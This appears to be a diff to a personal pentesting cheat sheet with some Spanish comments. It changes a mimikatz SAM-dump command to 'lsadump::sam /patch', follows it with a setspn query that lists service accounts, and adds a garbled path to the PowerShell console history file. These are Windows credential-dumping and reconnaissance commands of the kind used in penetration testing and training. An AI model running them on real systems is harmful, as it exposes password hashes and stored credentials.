@@ -137,4 +137,10 @@ Test-NetConnection -ComputerName localhost -Port 443
 \\tsclient\share\x64\mimikatz.exe # ejecutar mimikatz desde una compartida
 privilege::debug
 token::elevate
-lsadump::sam
+lsadump::sam /patch
+
+# SPN
+setspn.exe -T medin -Q */* #extract all users in SPN
+
+# Console_history
+ConsoleHost_Historyta\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
